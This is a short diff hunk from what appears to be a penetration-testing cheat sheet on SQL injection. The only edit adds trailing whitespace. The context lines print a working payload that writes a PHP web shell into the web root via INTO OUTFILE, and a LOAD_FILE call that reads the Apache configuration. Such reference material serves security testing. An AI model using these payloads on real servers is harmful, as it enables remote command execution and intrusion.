@@ -762,7 +762,7 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/bur
 -> hexadecimal, substr, etc...
   
 ### Webshell via SQLI
-`LOAD_FILE('/etc/httpd/conf/httpd.conf')`  
+`LOAD_FILE('/etc/httpd/conf/httpd.conf')`    
 `select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";`
   
 ### SQL Injection Second-Order (query connector)
